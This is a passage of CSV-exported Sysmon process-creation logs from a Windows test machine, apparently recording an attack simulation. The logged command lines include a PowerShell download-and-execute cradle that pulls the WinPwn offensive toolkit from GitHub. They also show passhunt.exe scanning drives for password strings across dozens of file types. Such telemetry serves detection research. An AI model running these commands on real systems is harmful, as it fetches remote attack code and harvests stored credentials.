      <Data Name=""Hashes"">MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-3d6c-658d-8902-000000000b00}</Data>
      <Data Name=""ParentProcessId"">2548</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""powershell.exe"" &amp; {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
passhunt -local $true -noninteractive}</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:18:57.203

ProcessGuid: {fda94052-3d81-658d-9202-000000000b00}

ProcessId: 10868

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.1635 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""C:\Windows\system32\cmd.exe"" /c start powershell -Command ""C:\Users\User\AppData\Local\Temp\passhunt.exe -s D:\ -r '(password|passwort|passwd| -p | -p=| -pw |

          -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.cfg,.msg,.inf,.reg,.cmd,.lo

        g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.jsp,.nsf,.phtml,.shtml;""

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {fda94052-3d6c-658d-8902-000000000b00}

ParentProcessId: 2548

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""powershell.exe"" &amp; {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
passhunt -local $true -noninteractive}

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"powershell  -Command ""C:\Users\User\AppData\Local\Temp\passhunt.exe -s C:\ -r '(password|passwort|passwd| -p | -p=| -pw |",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,,,,,,1,9504,,10.0.22621.2215 (WinBuild.160101.0800),"MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:18:57.198

ProcessGuid: {fda94052-3d81-658d-9002-000000000b00}

ProcessId: 6796

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2215 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: powershell  -Command ""C:\Users\User\AppData\Local\Temp\passhunt.exe -s C:\ -r '(password|passwort|passwd| -p | -p=| -pw |

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36

ParentProcessGuid: {fda94052-3d81-658d-8f02-000000000b00}

ParentProcessId: 9468

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""C:\Windows\system32\cmd.exe"" /c start powershell -Command ""C:\Users\User\AppData\Local\Temp\passhunt.exe -s C:\ -r '(password|passwort|passwd| -p | -p=| -pw |

          -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.cfg,.msg,.inf,.reg,.cmd,.lo

        g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.jsp,.nsf,.phtml,.shtml;""

ParentUser: WINDEV2309EVAL\User",Info,PowerShell.EXE,"""C:\Windows\system32\cmd.exe"" /c start powershell -Command ""C:\Users\User\AppData\Local\Temp\passhunt.exe -s C:\ -r '(password|passwort|passwd| -p | -p=| -pw |
          -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.cfg,.msg,.inf,.reg,.cmd,.lo
        g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.jsp,.nsf,.phtml,.shtml;""",C:\Windows\System32\cmd.exe,{fda94052-3d81-658d-8f02-000000000b00},9468,WINDEV2309EVAL\User,,{fda94052-3d81-658d-9002-000000000b00},7044,6796,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:18:57.1993539Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:18:57.198,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:18:57.1993539Z""/>
      <EventRecordID>9504</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:18:57.198</Data>
      <Data Name=""ProcessGuid"">{fda94052-3d81-658d-9002-000000000b00}</Data>
      <Data Name=""ProcessId"">6796</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2215 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows PowerShell</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      <Data Name=""CommandLine"">powershell  -Command ""C:\Users\User\AppData\Local\Temp\passhunt.exe -s C:\ -r '(password|passwort|passwd| -p | -p=| -pw |</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-3d81-658d-8f02-000000000b00}</Data>
      <Data Name=""ParentProcessId"">9468</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">""C:\Windows\system32\cmd.exe"" /c start powershell -Command ""C:\Users\User\AppData\Local\Temp\passhunt.exe -s C:\ -r '(password|passwort|passwd| -p | -p=| -pw |
          -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.cfg,.msg,.inf,.reg,.cmd,.lo
        g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.jsp,.nsf,.phtml,.shtml;""</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:18:57.198

ProcessGuid: {fda94052-3d81-658d-9002-000000000b00}

ProcessId: 6796

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2215 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: powershell  -Command ""C:\Users\User\AppData\Local\Temp\passhunt.exe -s C:\ -r '(password|passwort|passwd| -p | -p=| -pw |

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36

ParentProcessGuid: {fda94052-3d81-658d-8f02-000000000b00}

ParentProcessId: 9468

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""C:\Windows\system32\cmd.exe"" /c start powershell -Command ""C:\Users\User\AppData\Local\Temp\passhunt.exe -s C:\ -r '(password|passwort|passwd| -p | -p=| -pw |

          -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.cfg,.msg,.inf,.reg,.cmd,.lo

        g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.jsp,.nsf,.phtml,.shtml;""

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\system32\cmd.exe"" /c start powershell -Command ""C:\Users\User\AppData\Local\Temp\passhunt.exe -s C:\ -r '(password|passwort|passwd| -p | -p=| -pw |
          -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.cfg,.msg,.inf,.reg,.cmd,.lo
        g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.jsp,.nsf,.phtml,.shtml;""",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows Command Processor,,,,,,,1,9503,,10.0.22621.1635 (WinBuild.160101.0800),"MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964",C:\Windows\System32\cmd.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:18:57.189

ProcessGuid: {fda94052-3d81-658d-8f02-000000000b00}

ProcessId: 9468

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.1635 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""C:\Windows\system32\cmd.exe"" /c start powershell -Command ""C:\Users\User\AppData\Local\Temp\passhunt.exe -s C:\ -r '(password|passwort|passwd| -p | -p=| -pw |

          -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.cfg,.msg,.inf,.reg,.cmd,.lo

        g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.jsp,.nsf,.phtml,.shtml;""

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {fda94052-3d6c-658d-8902-000000000b00}

ParentProcessId: 2548

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""powershell.exe"" & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
passhunt -local $true -noninteractive}

ParentUser: WINDEV2309EVAL\User",Info,Cmd.Exe,"""powershell.exe"" & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
passhunt -local $true -noninteractive}",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{fda94052-3d6c-658d-8902-000000000b00},2548,WINDEV2309EVAL\User,,{fda94052-3d81-658d-8f02-000000000b00},7044,9468,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:18:57.1912746Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:18:57.189,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:18:57.1912746Z""/>
      <EventRecordID>9503</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:18:57.189</Data>
      <Data Name=""ProcessGuid"">{fda94052-3d81-658d-8f02-000000000b00}</Data>
      <Data Name=""ProcessId"">9468</Data>
      <Data Name=""Image"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1635 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows Command Processor</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">Cmd.Exe</Data>
      <Data Name=""CommandLine"">""C:\Windows\system32\cmd.exe"" /c start powershell -Command ""C:\Users\User\AppData\Local\Temp\passhunt.exe -s C:\ -r '(password|passwort|passwd| -p | -p=| -pw |
          -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.cfg,.msg,.inf,.reg,.cmd,.lo
        g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.jsp,.nsf,.phtml,.shtml;""</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-3d6c-658d-8902-000000000b00}</Data>
      <Data Name=""ParentProcessId"">2548</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""powershell.exe"" &amp; {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
passhunt -local $true -noninteractive}</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:18:57.189

ProcessGuid: {fda94052-3d81-658d-8f02-000000000b00}

ProcessId: 9468

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.1635 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""C:\Windows\system32\cmd.exe"" /c start powershell -Command ""C:\Users\User\AppData\Local\Temp\passhunt.exe -s C:\ -r '(password|passwort|passwd| -p | -p=| -pw |

          -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.cfg,.msg,.inf,.reg,.cmd,.lo

        g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.jsp,.nsf,.phtml,.shtml;""

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {fda94052-3d6c-658d-8902-000000000b00}

ParentProcessId: 2548

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""powershell.exe"" &amp; {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
passhunt -local $true -noninteractive}

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe"" -Embedding",-,WinDev2309Eval,,C:\Windows\system32\,-,,,,,,,1,9502,,-,"MD5=8C608622D60DD9E76274883252698EC2,SHA256=A1686717DA0D79F2DB071A6866677BFD492B44EAA47EB375A992145A6F4BD874,IMPHASH=3815098BF50AB7C56CCBDE82FF05FFDB",C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:18:57.149

ProcessGuid: {fda94052-3d81-658d-8e02-000000000b00}

ProcessId: 7632

Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe

FileVersion: -

Description: -

Product: -

Company: -

OriginalFileName: -

CommandLine: ""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe"" -Embedding

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=8C608622D60DD9E76274883252698EC2,SHA256=A1686717DA0D79F2DB071A6866677BFD492B44EAA47EB375A992145A6F4BD874,IMPHASH=3815098BF50AB7C56CCBDE82FF05FFDB

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 932

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,-,-,-,{00000000-0000-0000-0000-000000000000},932,-,,{fda94052-3d81-658d-8e02-000000000b00},7044,7632,-,,,,,"
      ",-,,,,,,2023-12-28T09:18:57.1511702Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:18:57.149,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:18:57.1511702Z""/>
      <EventRecordID>9502</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:18:57.149</Data>
      <Data Name=""ProcessGuid"">{fda94052-3d81-658d-8e02-000000000b00}</Data>
      <Data Name=""ProcessId"">7632</Data>
      <Data Name=""Image"">C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe</Data>
      <Data Name=""FileVersion"">-</Data>
      <Data Name=""Description"">-</Data>
      <Data Name=""Product"">-</Data>
      <Data Name=""Company"">-</Data>
      <Data Name=""OriginalFileName"">-</Data>
      <Data Name=""CommandLine"">""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe"" -Embedding</Data>
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=8C608622D60DD9E76274883252698EC2,SHA256=A1686717DA0D79F2DB071A6866677BFD492B44EAA47EB375A992145A6F4BD874,IMPHASH=3815098BF50AB7C56CCBDE82FF05FFDB</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">932</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:18:57.149

ProcessGuid: {fda94052-3d81-658d-8e02-000000000b00}

ProcessId: 7632

Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe

FileVersion: -

Description: -

Product: -

Company: -

OriginalFileName: -

CommandLine: ""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe"" -Embedding

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=8C608622D60DD9E76274883252698EC2,SHA256=A1686717DA0D79F2DB071A6866677BFD492B44EAA47EB375A992145A6F4BD874,IMPHASH=3815098BF50AB7C56CCBDE82FF05FFDB

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 932

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
